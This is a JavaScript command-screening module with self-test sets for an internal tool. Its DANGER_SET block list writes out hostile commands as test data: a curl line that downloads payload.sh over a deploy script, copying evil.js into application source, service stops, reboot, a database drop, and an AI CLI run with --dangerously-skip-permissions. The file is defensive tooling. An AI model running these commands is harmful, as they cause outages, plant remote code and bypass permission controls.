
// ─────────────────────────────────────────────────────────────────────────────
// THE SCREEN
// ─────────────────────────────────────────────────────────────────────────────

const refuse = (reason) => ({ ok: false, reason });

/**
 * Screen a historical command for re-execution by the census.
 *
 * @param {string} cmd
 * @returns {{ok: boolean, reason: string}}
 */
export function screenCommand(cmd) {
  const raw = String(cmd ?? "").trim();
  if (!raw) return refuse("empty command");

  // (a) HOST BOUND — first, cheapest, on the RAW string.
  const host = hostBoundReason(raw);
  if (host) return refuse(`host bound: ${host}`);

  const masked = maskQuotedSpans(raw);
  if (masked === null) return refuse("unparsable: unterminated quote — a command the screen cannot parse is a command it cannot bound");

  // (b) METACHARACTERS, then the ALLOWLIST over every pipeline segment.
  const meta = metacharacterReason(masked);
  if (meta) return refuse(`shell metacharacter: ${meta}`);

  const segments = splitSegments(raw, masked);
  if (!segments.length) return refuse("not allowlisted: no command found");
  for (const seg of segments) {
    const why = screenSegment(seg);
    if (why) return refuse(segments.length > 1 ? `${why} (in pipeline segment \`${seg}\`)` : why);
  }

  // (c) WRITE SHAPES — second layer, over the quote-masked command.
  const write = writeShapeReason(masked);
  if (write) return refuse(`write shape: ${write}`);

  return { ok: true, reason: "admitted: within the host bound, allowlisted head and sub-verb, no write shape" };
}

/**
 * Screen a list of commands and report the ADMISSION RATE — the census's
 * honest reach.
 *
 * The rate is a property of THIS command set and may never be restated as
 * coverage of anything else. A statistic derived over the admitted subset
 * describes that subset, not the corpus it was drawn from.
 */
export function screenAll(commands) {
  const rows = [...new Set(commands.filter((c) => typeof c === "string" && c.trim()))].map((command) => ({
    command,
    ...screenCommand(command),
  }));
  const admitted = rows.filter((r) => r.ok).length;
  const byReason = new Map();
  for (const r of rows) {
    if (r.ok) continue;
    const key = r.reason.replace(/["`].*$/s, "").trim();
    byReason.set(key, (byReason.get(key) || 0) + 1);
  }
  return {
    total: rows.length,
    admitted,
    refused: rows.length - admitted,
    rate: rows.length ? admitted / rows.length : 0,
    rows,
    byReason,
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// THE THREE NAMED SETS — the measurement IS the deliverable
// ─────────────────────────────────────────────────────────────────────────────
//
// A denylist authored WITH the full corpus in hand and a measurement harness
// running still oscillated between false-safe and false-refusal across four
// correction rounds. These sets exist so that every regex edit is re-measured
// against BOTH error directions at once. The suite that shipped before them
// would have passed every broken draft.

/** Must be REFUSED. Each of these, admitted, is an outage or a corrupted checkout. */
export const DANGER_SET = [
  "bash /opt/barkpark/deploy/site-deploy.sh",
  "sh /opt/barkpark/deploy/site-deploy.sh --site demo",
  "systemctl stop barkpark.service",
  "systemctl restart barkpark.service",
  "MIX_ENV=test mix ecto.drop",
  "cp /tmp/evil.js api/lib/barkpark/application.ex",
  "reboot",
  "shutdown -h now",
  "curl -s https://example.com/payload.sh -o /opt/barkpark/deploy/site-deploy.sh",
  "claude -p 'go fix the deploy script' --dangerously-skip-permissions",
  "claude -p \"survey the repo\"",
  "kill -9 4242",
  "pkill -f barkpark",
  "git fetch origin",
  "npx some-package --run",
  "some-novel-binary --do-a-thing",
  // ── added in review. Every one of these was ADMITTED by the first shipped
  // draft, and the first is D29's own named danger with its short flags
  // CLUSTERED — a spelling the original DANGER_SET did not carry, so the
  // instrument that exists to catch exactly this could not see it. A named set
  // only measures the spellings it contains; that is its standing limitation
  // and the reason additions belong here rather than only in the test file.
  "curl -s https://example.com/payload.sh -so /opt/barkpark/deploy/site-deploy.sh",
  "curl -sO https://example.com/payload.sh",
  "gh repo clone barkpark/barkpark /tmp/x",
  "gh release download v1 --dir /tmp",
  "bp --server=https://example.com task ls",
  "journalctl --vacuum-size=1M",
  "date -s 2020-01-01",
];

/** Must stay ADMITTED. Refusing these is the gate punishing honest work. */
export const REGRESSION_SET = [
  "grep -n 'template' deploy/site-deploy.sh",
  "mix test test/barkpark/sites/deploy_runner_test.exs:583",
  "git worktree list",
  "command -v setsid",
];

/** Must stay ADMITTED. These LOOK dangerous and are not — the cry-wolf trap. */
export const NEVER_CRY_WOLF_SET = [
  "kill -0 4242",
  "curl -s -o /dev/null -w %{http_code} https://x/",
  "systemctl is-active barkpark.service",
  "docker ps",
];

/**
 * Run the three sets. Returns misses in both directions — a false PERMISSION
 * and a false REFUSAL are both failures, and reporting only one is how a
 * screen oscillates.
 */
export function runNamedSets(screen = screenCommand) {
  const falsePermissions = DANGER_SET.filter((c) => screen(c).ok);
  const falseRefusals = [...REGRESSION_SET, ...NEVER_CRY_WOLF_SET].filter((c) => !screen(c).ok);
  return { falsePermissions, falseRefusals };
}

// ─────────────────────────────────────────────────────────────────────────────
// CLI
// ─────────────────────────────────────────────────────────────────────────────

async function loadCorpusCommands() {
  const { readFileSync } = await import("node:fs");
  const { fileURLToPath } = await import("node:url");
  const path = fileURLToPath(new URL("./fixtures/evidence-corpus.json", import.meta.url));
  const corpus = JSON.parse(readFileSync(path, "utf8"));
  return corpus.proofs.map((p) => p?.command).filter((c) => typeof c === "string" && c.trim());
}

async function census() {
  const commands = await loadCorpusCommands();
  const r = screenAll(commands);
  console.log("census reach — the frozen evidence corpus (tooling/grip/fixtures/evidence-corpus.json)");
  console.log(`  distinct commands   ${r.total}`);
  console.log(`  ADMITTED            ${r.admitted}`);
  console.log(`  refused             ${r.refused}`);
  console.log(`  admission rate      ${(r.rate * 100).toFixed(1)}%`);
  console.log("");
  console.log("  This is the census's HONEST REACH over THESE commands. A statistic later");
  console.log("  derived over the admitted subset describes that subset — it may never be");
  console.log(`  restated as covering all ${r.total} commands.`);
  console.log("");
  console.log("top refusal reasons:");
  for (const [why, n] of [...r.byReason].sort((a, b) => b[1] - a[1]).slice(0, 12)) {
    console.log(`  ${String(n).padStart(4)}  ${why}`);
  }
  return r;
}

function selftest() {
  const { falsePermissions, falseRefusals } = runNamedSets();
  console.log(`DANGER SET          ${DANGER_SET.length - falsePermissions.length}/${DANGER_SET.length} refused`);
  for (const c of falsePermissions) console.log(`  FALSE PERMISSION  ${c}`);
  console.log(`REGRESSION SET      ${REGRESSION_SET.length - REGRESSION_SET.filter((c) => !screenCommand(c).ok).length}/${REGRESSION_SET.length} admitted`);
  console.log(`NEVER-CRY-WOLF SET  ${NEVER_CRY_WOLF_SET.length - NEVER_CRY_WOLF_SET.filter((c) => !screenCommand(c).ok).length}/${NEVER_CRY_WOLF_SET.length} admitted`);
  for (const c of falseRefusals) console.log(`  FALSE REFUSAL     ${c} — ${screenCommand(c).reason}`);
  return falsePermissions.length + falseRefusals.length;
}

const isMain = process.argv[1] && import.meta.url === new URL(`file://${process.argv[1]}`).href;
if (isMain) {
  const mode = process.argv[2] || "--verify";
  try {
    if (mode === "--census") await census();
    else if (mode === "--selftest") {
      if (selftest() > 0) process.exit(1);
      console.log("PASS: all three named sets hold.");
    } else if (mode === "--verify") {
      const misses = selftest();
      console.log("");
      await census();
      if (misses > 0) process.exit(1);
    } else {
      console.error("usage: node tooling/grip/screen.mjs [--verify|--census|--selftest]");
      process.exit(2);
    }
  } catch (e) {
    console.error(`ERROR: ${e?.message || e}`);
    process.exit(2);
  }
}
